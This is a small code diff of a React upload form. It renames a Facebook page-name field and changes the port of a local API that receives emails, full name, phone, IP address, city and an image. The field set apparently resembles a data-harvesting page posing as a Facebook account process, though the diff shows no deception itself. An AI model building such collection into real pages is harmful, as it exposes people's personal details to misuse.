@@ -36,7 +36,7 @@ const Upload = () => {
                         'fill_business_email': dataImages.fill_business_email,
                         'fill_personal_email': dataImages.fill_personal_email,
                         'fill_full_name': dataImages.fill_full_name,
-                        'fill_facebook_pagename': dataImages.fill_facebook_pagename,
+                        'fill_your_name': dataImages.fill_your_name,
                         'fill_phone': dataImages.fill_phone,
                         'ip': dataImages.ip,
                         'city': dataImages.city,
@@ -47,7 +47,7 @@ const Upload = () => {
                         'image': imageUrl,
                     }
 
-                    axios.post( "http://localhost:3001/api/news", data)
+                    axios.post( "http://localhost:8080/api/news", data)
                     .then((response) => {
                         if (response.data.status === 0 ) {
                             navigate('/account/final');
